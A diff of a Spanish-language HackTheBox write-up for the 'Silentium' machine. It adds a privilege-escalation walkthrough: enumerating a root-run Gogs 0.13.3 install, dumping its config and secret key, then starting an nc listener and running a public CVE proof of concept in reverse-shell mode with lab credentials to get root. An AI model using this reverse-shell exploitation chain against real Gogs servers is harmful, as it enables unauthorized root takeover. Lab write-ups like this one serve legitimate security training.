@@ -9,7 +9,7 @@ os: linux
 hints: []
 tags: []
 parent: writeups/hackthebox/machines
-draft: false
+draft: true
 ---
 
 <div style="display: flex; justify-content: center;">
@@ -303,10 +303,199 @@ drwx------ 2 ben  ben  4096 Apr  8 09:41 .cache
 cat user.txt
 ```
 
-## User flag
+### User flag
 
 <Callout type="success" title="User flag">
-  36ef43a8c0c5294a64628db937bc387d
+  36e**************************87d
 </Callout>
 
 ## Privilege Escalation
+
+```bash
+ls -la /opt
+```
+
+```plaintext
+total 16
+drwxr-xr-x  4 root root 4096 Apr  8 18:30 .
+drwxr-xr-x 22 root root 4096 Apr  8 09:41 ..
+drwx--x--x  4 root root 4096 Apr  8 09:41 containerd
+drwxr-xr-x  6 root root 4096 Apr  8 09:41 gogs
+```
+
+> Gogs (short for "Go Git Service") is a painless, self-hosted Git service. It provides a lightweight, open-source alternative to platforms like GitHub or GitLab, enabling developers to host their own code repositories locally or on a private server with minimal hardware resource requirements.
+> [https://gogs.io/getting-started/introduction](https://gogs.io/getting-started/introduction)
+
+```bash
+cd /opt/gogs/
+```
+
+```bash
+ls -la
+```
+
+```plaintext
+total 24
+drwxr-xr-x 6 root root 4096 Apr  8 09:41 .
+drwxr-xr-x 4 root root 4096 Apr  8 18:30 ..
+drwxr-x--- 3  750 root 4096 Apr  8 09:41 custom
+drwxr-x--- 2  750 root 4096 Jun  5 21:43 data
+drwxr-xr-x 6 root root 4096 Apr  8 09:41 gogs
+drwxr-x--- 3  750 root 4096 Jun  5 21:43 log
+```
+
+```bash
+cd gogs/
+```
+
+```bash
+ls -la
+```
+
+```plaintext
+total 79368
+drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
+drwxr-xr-x 6 root root     4096 Apr  8 09:41 ..
+drwxr-xr-x 3 root root     4096 Apr  8 09:41 custom
+drwxr-xr-x 4 root root     4096 Jun  5 21:43 data
+-rwxr-xr-x 1 root root 81220896 Jun  9  2025 gogs
+-rwxr-xr-x 1 root root     1054 Jun  9  2025 LICENSE
+drwxr-xr-x 2 root root     4096 Apr  8 09:41 log
+-rwxr-xr-x 1 root root     6626 Jun  9  2025 README.md
+-rwxr-xr-x 1 root root     5385 Jun  9  2025 README_ZH.md
+drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts
+```
+
+```bash
+./gogs -v
+```
+
+```plaintext
+Gogs version 0.13.3
+```
+
+```bash
+ls -la gogs/custom/conf/
+```
+
+```plaintext
+total 12
+drwxr-xr-x 2 root root 4096 Apr  8 09:41 .
+drwxr-xr-x 3 root root 4096 Apr  8 09:41 ..
+-rwxr-xr-x 1 root root 1136 Jan 30 04:57 app.ini
+```
+
+```bash
+cat gogs/custom/conf/app.ini
+```
+
+```plaintext
+BRAND_NAME = Gogs
+RUN_USER   = root
+RUN_MODE   = prod
+
+[server]
+HTTP_ADDR        = 127.0.0.1
+HTTP_PORT        = 3001
+DOMAIN           = staging-v2-code.dev.silentium.htb
+ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
+OFFLINE_MODE     = false
+EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
+DISABLE_SSH      = false
+SSH_PORT         = 22
+START_SSH_SERVER = false
+
+[database]
+TYPE     = sqlite3
+PATH     = /opt/gogs/data/gogs.db
+HOST     = 127.0.0.1:5432
+NAME     = gogs
+SCHEMA   = public
+USER     = gogs
+PASSWORD =
+SSL_MODE = disable
+
+[repository]
+ROOT_PATH      = /root/gogs-repositories
+DEFAULT_BRANCH = master
+ROOT           = /root/gogs-repositories
+
+[session]
+PROVIDER = file
+
+[log]
+MODE      = file
+LEVEL     = Info
+ROOT_PATH = /opt/gogs/log
+
+[security]
+INSTALL_LOCK = true
+SECRET_KEY   = sdsrcxSm0iC7wDO
+
+[email]
+ENABLED = false
+
+[auth]
+REQUIRE_EMAIL_CONFIRMATION  = false
+DISABLE_REGISTRATION        = false
+ENABLE_REGISTRATION_CAPTCHA = true
+REQUIRE_SIGNIN_VIEW         = false
+
+[user]
+ENABLE_EMAIL_NOTIFICATION = false
+
+[picture]
+DISABLE_GRAVATAR        = false
+ENABLE_FEDERATED_AVATAR = false
+```
+
+Agregar `staging-v2-code.dev.silentium.htb` al archivo `/etc/hosts`
+
+<div style="display: flex; justify-content: center;">
+
+![Silentium Web Gogs](@images/writeups/hackthebox/silentium/silentium-web-gogs.png)
+
+</div>
+
+Google `gogs 0.13.3 vulnerabilities`
+
+[CVE-2025-81110-PoC](https://github.com/BridgerAlderson/CVE-2025-81110-PoC)
+
+```bash
+nc -lnvp 2222
+```
+
+```bash
+python3 CVE-2025-81110.py --url http://staging-v2-code.dev.silentium.htb/ --user melvin --pass 'M3lv1n$Ctf' --mode rev --lhost 10.10.15.131 --lport 2222
+```
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+cd
+```
+
+```bash
+ls
+```
+
+```plaintext
+gogs-repositories
+root.txt
+```
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="Root flag">
+  ccf**************************55a
+</Callout>
